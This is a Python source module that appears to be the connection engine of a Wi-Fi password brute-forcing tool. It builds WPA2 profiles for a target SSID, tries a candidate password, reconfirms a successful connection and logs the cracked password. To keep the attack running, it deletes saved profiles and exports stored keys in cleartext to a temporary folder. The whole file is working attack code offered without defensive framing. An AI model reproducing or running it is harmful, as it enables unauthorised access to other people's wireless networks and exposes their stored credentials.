import os
import platform
import shutil
import subprocess
import tempfile
import time
import xml.sax.saxutils as saxutils

import pywifi
from pywifi import const

DISCONNECTED_STATES = (const.IFACE_DISCONNECTED, const.IFACE_INACTIVE)
ATTACK_PROFILE = "PyCrackAttack"
CONNECT_TIMEOUT = 15


class WifiManager:
    def __init__(self, logger):
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.logger = logger
        self._use_netsh = platform.system() == "Windows"
        self._target_ssid = None
        self._backup_dir = None
        self._backup_profile_path = None

    def _run_netsh(self, args):
        result = subprocess.run(
            ["netsh", "wlan", *args],
            capture_output=True,
            text=True,
            encoding="utf-8",
            errors="replace",
        )
        return result.returncode, (result.stdout + result.stderr).strip()

    def _get_connected_ssid_netsh(self):
        code, output = self._run_netsh(["show", "interfaces"])
        if code != 0:
            return None

        state = None
        ssid = None
        for line in output.splitlines():
            line = line.strip()
            if line.lower().startswith("state"):
                state = line.split(":", 1)[1].strip().lower()
            elif line.lower().startswith("ssid") and not line.lower().startswith("bssid"):
                ssid = line.split(":", 1)[1].strip()

        if state == "connected" and ssid:
            return ssid
        return None

    def _disconnect_netsh(self, timeout=8):
        self._run_netsh(["disconnect"])
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self._get_connected_ssid_netsh() is None:
                return True
            time.sleep(0.4)
        return False

    def _delete_profile_netsh(self, profile_name):
        self._run_netsh(["delete", "profile", f"name={profile_name}"])

    def _build_profile_xml(self, profile_name, ssid, password):
        return f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{saxutils.escape(profile_name)}</name>
    <SSIDConfig>
        <SSID>
            <name>{saxutils.escape(ssid)}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{saxutils.escape(password)}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

    def _add_profile_from_xml(self, profile_name, ssid, password):
        xml_path = None
        try:
            with tempfile.NamedTemporaryFile(
                mode="w", suffix=".xml", delete=False, encoding="utf-8"
            ) as handle:
                handle.write(self._build_profile_xml(profile_name, ssid, password))
                xml_path = handle.name

            code, output = self._run_netsh(["add", "profile", f"filename={xml_path}"])
            if code != 0:
                self.logger.warning(f"Failed to add profile: {output}")
                return False
            return True
        finally:
            if xml_path and os.path.exists(xml_path):
                os.unlink(xml_path)

    def _wait_for_ssid_netsh(self, ssid, timeout=CONNECT_TIMEOUT):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self._get_connected_ssid_netsh() == ssid:
                return True
            time.sleep(0.5)
        return False

    def _connect_with_profile_netsh(self, profile_name, ssid):
        self._run_netsh(["connect", f"name={profile_name}", f"ssid={ssid}"])
        return self._wait_for_ssid_netsh(ssid)

    def _verify_password_netsh(self, ssid, password):
        """Disconnect and reconnect once more to confirm this password actually works."""
        if not self._disconnect_netsh(timeout=8):
            return False
        return self._connect_with_profile_netsh(ATTACK_PROFILE, ssid)

    def _connect_to_network_netsh(self, ssid, password):
        if not self._disconnect_netsh(timeout=8):
            self.logger.warning("Adapter did not fully disconnect before retry.")

        self._delete_profile_netsh(ATTACK_PROFILE)
        if not self._add_profile_from_xml(ATTACK_PROFILE, ssid, password):
            return False

        if not self._connect_with_profile_netsh(ATTACK_PROFILE, ssid):
            self._disconnect_netsh(timeout=5)
            return False

        if not self._verify_password_netsh(ssid, password):
            self.logger.info("Connection did not survive verification; treating as failure.")
            self._disconnect_netsh(timeout=5)
            return False

        self.logger.info(f"SUCCESS! Password for {ssid} is: {password}")
        return True

    def _wait_for_status(self, target_statuses, timeout=5):
        deadline = time.time() + timeout
        while time.time() < deadline:
            if self.iface.status() in target_statuses:
                return True
            time.sleep(0.3)
        return False

    def _disconnect_pywifi(self, timeout=5):
        self.iface.disconnect()
        return self._wait_for_status(DISCONNECTED_STATES, timeout)

    def _connect_to_network_pywifi(self, ssid, password):
        if not self._disconnect_pywifi(timeout=8):
            self.logger.warning("Adapter did not fully disconnect before retry.")

        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        self.iface.connect(tmp_profile)

        deadline = time.time() + CONNECT_TIMEOUT
        while time.time() < deadline:
            if self.iface.status() == const.IFACE_CONNECTED:
                self.logger.info(f"SUCCESS! Password for {ssid} is: {password}")
                return True
            time.sleep(0.5)

        self._disconnect_pywifi(timeout=3)
        return False

    def _backup_target_profile(self, target_ssid):
        self._backup_dir = tempfile.mkdtemp(prefix="pycrack_backup_")
        code, output = self._run_netsh(
            ["export", "profile", f"name={target_ssid}", f"folder={self._backup_dir}", "key=clear"]
        )
        if code != 0:
            self.logger.info(f"No saved profile to back up for {target_ssid}.")
            return

        exported_files = [
            os.path.join(self._backup_dir, name)
            for name in os.listdir(self._backup_dir)
            if name.lower().endswith(".xml")
        ]
        if exported_files:
            self._backup_profile_path = exported_files[0]
            self.logger.info(f"Backed up saved profile for {target_ssid}.")
        else:
            self.logger.warning(f"Profile export succeeded but no XML file was found: {output}")

    def _cleanup_backup_dir(self):
        if self._backup_dir and os.path.isdir(self._backup_dir):
            shutil.rmtree(self._backup_dir, ignore_errors=True)
        self._backup_dir = None
        self._backup_profile_path = None

    def prepare_for_attack(self, target_ssid):
        """Disconnect and remove saved profile so Windows cannot auto-reconnect mid-attack."""
        self._target_ssid = target_ssid
        self.logger.info("Disconnecting from current network before attack...")

        if self._use_netsh:
            self._disconnect_netsh(timeout=8)
            self._delete_profile_netsh(ATTACK_PROFILE)
            self._backup_target_profile(target_ssid)
            self._delete_profile_netsh(target_ssid)
        else:
            self._disconnect_pywifi(timeout=8)
            self.iface.remove_all_network_profiles()

    def cleanup_after_attack(self, password_found=None):
        """Restore the user's saved profile or keep them connected with the found password."""
        if not self._use_netsh:
            return

        self._delete_profile_netsh(ATTACK_PROFILE)

        if password_found and self._target_ssid:
            self._add_profile_from_xml(self._target_ssid, self._target_ssid, password_found)
            self._connect_with_profile_netsh(self._target_ssid, self._target_ssid)
            self._cleanup_backup_dir()
            return

        if self._backup_profile_path and os.path.exists(self._backup_profile_path):
            code, output = self._run_netsh(["add", "profile", f"filename={self._backup_profile_path}"])
            if code == 0:
                self.logger.info(f"Restored saved profile for {self._target_ssid}.")
                self._connect_with_profile_netsh(self._target_ssid, self._target_ssid)
            else:
                self.logger.warning(f"Could not restore saved profile: {output}")

        self._cleanup_backup_dir()

    def scan_networks(self):
        self.logger.info("Scanning for networks...")
        self.iface.scan()
        time.sleep(2)
        results = self.iface.scan_results()

        networks = []
        seen_ssids = set()

        for network in results:
            ssid = network.ssid
            if ssid and ssid not in seen_ssids:
                networks.append(network)
                seen_ssids.add(ssid)

        self.logger.info(f"Found {len(networks)} networks.")
        return networks

    def connect_to_network(self, ssid, password):
        if self._use_netsh:
            return self._connect_to_network_netsh(ssid, password)
        return self._connect_to_network_pywifi(ssid, password)
